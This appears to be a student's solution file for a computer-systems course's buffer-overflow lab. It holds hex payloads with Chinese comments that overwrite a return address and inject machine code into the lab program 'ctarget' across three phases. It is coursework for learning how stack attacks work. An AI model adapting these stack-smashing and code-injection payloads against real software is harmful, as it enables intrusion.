/* 从文档中得知可以这样调用命令 cat exploit.txt | ./hex2raw | ./ctarget -q */
 /* 
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
c0 17 40 00 00 00 00 00 /* call touch1 phase1 注入字符串使得程序跳到touch1  */
 */

 /* 
bf fa 97 b9 59       /* movl $0x59b997fa,%edi 地址是0x5561dc78  */ 
48 c7 c0 ec 17 40 00 /* mov    $0x4017ec,%rax 除了直接跳转外，也可以将地址push到栈中，然后ret，使得设置pc为所需地址 */ 
ff e0                /* jmpq   *%rax */ 
00 00 00 00 00 00    /* 无用数据 */ 
00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00
78 dc 61 55 00 00 00 00  /* 溢出覆盖的返回地址，跳到0x5561dc78 */ 
 /* 具体思路是：gets从文件中得到上边所述的一串序列，存到以0x5561dc78地址开头的栈中 溢出到上一层调用函数的返回地址 */
 /* 当本函数结束，return时调用溢出覆盖的返回地址，使程序控制跳转到0x5561dc78，然后执行touch2能过的操作 */  
 /* 值得注意的是，不要认为gets边写数据边就把指令执行了，这是不对的,仅仅是写数据而已； */ 
 /* 整个注入的病毒代码是从return返回使得程序控制转到想要的地址然后将字节流看成是可执行指令继续执行来进行的 */ 
 */ 


48 c7 c7 70 dc 61 55
48 b9 35 39 62 39 39
37 66 61
48 89 0f
48 c7 c0 fa 18 40 00
ff e0
00 00 00 00 00 00 00 00 00 00 00
78 dc 61 55 00 00 00 00
 /* 具体思路是 gets得到上面一串序列，然后执行相关的赋值操作 跳到phase3后，会由于保存寄存器以及其他需要gdb调试才能看出来的原因，将数据放在了78-8处 */ 
 /* 事实上，留下来的40字节的空间都被覆盖了，只能是将rdi设置到之外的空间 然后把对应空间的值设置成想要的值 */ 
